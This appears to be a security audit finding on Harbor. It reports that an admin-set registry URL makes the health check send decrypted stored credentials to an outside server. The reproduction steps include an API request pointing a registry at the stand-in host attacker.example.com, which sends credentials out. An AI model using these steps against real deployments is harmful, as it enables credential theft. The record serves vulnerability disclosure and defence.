Phase: 8
Sequence: 025
Slug: registry-credential-theft
Verdict: VALID
Rationale: System admin can point a registry record URL at an attacker server; Harbor sends stored registry credentials (decrypted from DB) via Basic auth on health check to the attacker URL, enabling credential exfiltration with no IP filtering.
Severity-Original: HIGH
PoC-Status: theoretical
Pre-FP-Flag: none
Debate: security/chamber-workspace/chamber-02/debate.md
Adversarial-Verdict: CONFIRMED
Adversarial-Rationale: Code path mechanically verified end-to-end from admin-controlled URL through auth discovery to Basic auth credential transmission with no IP filtering; reproduction blocked due to deployment complexity but code analysis is conclusive.
Severity-Final: MEDIUM
PoC-Status: theoretical

## Summary

When a system administrator creates or updates a registry record with an attacker-controlled URL, Harbor's health check mechanism sends the stored registry credentials (access_key and access_secret) to the attacker's server via HTTP Basic authentication. The credentials are encrypted at rest in PostgreSQL but decrypted in memory for the health check HTTP request. The URL is validated only for scheme (http/https) via `ValidateHTTPURL`, with no IP filtering.

## Location

- `src/server/v2.0/handler/registry.go:46-76` -- `CreateRegistry` stores URL + credentials
- `src/server/v2.0/handler/registry.go:179` -- `GetRegistryInfo` triggers health check
- `src/pkg/reg/adapter/native/adapter.go:66-78` -- `NewAdapter` creates HTTP client with credentials
- `src/pkg/reg/adapter/native/adapter.go:118` -- `HealthCheck` sends GET {url}/v2/ with Basic auth

## Attacker Control

- System admin controls registry URL and can point it at any HTTP/HTTPS endpoint
- Credentials are user-supplied and stored encrypted, but decrypted for transmission
- Health check triggered immediately via `GetRegistryInfo` or automatically on schedule

## Trust Boundary Crossed

- TB-8: Core/Job Service to attacker-controlled endpoint
- Stored credentials cross from encrypted DB storage to plaintext transmission to untrusted target

## Impact

- Exfiltration of all stored registry credentials for the targeted registry record
- Credentials can be used to access the legitimate remote registry
- Combined with H-00e port scan, attacker can discover internal registries and target credentials

## Evidence

- Deep Probe PH-13/PH-C04: Validated end-to-end
- native/adapter.go:66-78: `registry.NewClientWithCACert(reg.URL, username, password)` uses decrypted credentials
- URL validation via ValidateHTTPURL (scheme-only, no IP filtering)

## Reproduction Steps

1. Authenticate as system administrator
2. Create registry: `POST /api/v2.0/registries` with `{"url": "http://attacker.example.com", "credential": {"type": "basic", "access_key": "user", "access_secret": "pass"}}`
3. Trigger health check: `GET /api/v2.0/registries/{id}/info`
4. On attacker server, observe incoming GET /v2/ with `Authorization: Basic <base64(user:pass)>`
